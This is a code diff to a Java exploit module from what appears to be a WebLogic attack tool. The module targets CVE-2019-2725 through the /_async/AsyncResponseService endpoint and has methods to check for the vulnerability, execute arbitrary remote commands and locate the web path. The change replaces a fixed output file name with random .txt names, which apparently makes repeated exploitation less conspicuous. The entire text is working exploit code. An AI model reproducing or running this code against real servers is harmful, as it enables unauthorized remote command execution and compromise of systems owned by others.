@@ -4,10 +4,12 @@
  * and open the template in the editor.
  */
 package com.js.codeexec.paylaod;
+import static com.js.codeexec.paylaod.CVE_2019_2725_10.randName;
 import com.js.codeexec.tools.HttpTool;
 import com.js.codeexec.tools.Tools;
 import java.io.InputStream;
 import java.util.HashMap;
+import java.util.Random;
 import java.util.Scanner;
 
 /**
@@ -17,19 +19,24 @@ import java.util.Scanner;
 public class CVE_2019_2725_10_bypass implements BasePayload {
     private static final String CheckStr="xml_test"; 
     private static final String VULURL="/_async/AsyncResponseService";
-    private static final String FileAbsPath="/_async/"; 
-    
-    private static final String responsePath="favicon.ico";
+    private static final String FileAbsPath="/_async/";
     public String getExp(String path){ 
          InputStream in = this.getClass().getResourceAsStream(path);
           Scanner s = new Scanner(in).useDelimiter("\\A");
          String str = s.hasNext() ? s.next() : "";
          return str;
     }
+    
+    public static Random rd=new Random();
+    public static String randName(){
+        int f= rd.nextInt(999999);
+        return f+".txt";
+    }
 
     @Override
     public boolean checkVUL(String url) throws Exception{ 
         try {
+            String responsePath=randName();
            HashMap<String,String> map=new HashMap<String,String>();
            String data=Tools.str2Hex("a$$$$"+responsePath+"$$$$"+CheckStr);
            data=Tools.reverse(data);
@@ -55,6 +62,7 @@ public class CVE_2019_2725_10_bypass implements BasePayload {
     @Override
     public String exeCMD(String url, String cmd,String encoding)  throws Exception{
         try {
+             String responsePath=randName();
             HashMap<String,String> map=new HashMap<String,String>();
            String data=Tools.str2Hex(cmd+"$$$$"+responsePath);
            data=Tools.reverse(data);
@@ -98,7 +106,7 @@ public class CVE_2019_2725_10_bypass implements BasePayload {
     @Override
     public String getWebPath(String url) throws Exception {
         try {
-          
+           String responsePath=randName();
             HashMap<String,String> map=new HashMap<String,String>();
            String data=Tools.str2Hex(responsePath);
            data=Tools.reverse(data);
